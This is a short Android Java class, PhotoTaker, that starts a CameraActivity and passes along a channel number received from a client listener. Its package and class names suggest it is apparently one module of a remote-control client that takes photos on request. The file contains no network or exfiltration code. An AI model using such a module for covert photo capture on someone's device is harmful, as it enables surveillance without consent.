package my.app.Library;

import my.app.client.Client;
import my.app.client.ClientListener;
import android.content.ComponentName;
import android.content.Intent;
import android.util.Log;


public class PhotoTaker {
	
	private ClientListener ctx;
	int chan ;
	
	
	
	
	
	public PhotoTaker(ClientListener ctx,int chan) {
		Log.i("PhotoTaker", "Constructing object Phototaker");
		this.chan = chan ;
		this.ctx = ctx;
	}

	public boolean takePhoto() {
		//creating a new activity in order to take the photo. needed in new apis. 
		try{
		     Intent intent = new Intent();
		     intent.setAction(Intent.ACTION_MAIN);
		     intent.addCategory(Intent.CATEGORY_LAUNCHER);
		     intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		     ComponentName cn = new ComponentName(ctx, CameraActivity.class);
		     intent.setComponent(cn);
		     intent.putExtra("chan", chan);
		     ctx.startActivity(intent);
		}catch (Exception e){
			Log.e("PhotoTaker", "ERROR in takePhoto : " + e.toString());
			return false;
		}
		return true;
	}
	
	
	
	
	
	
	
}
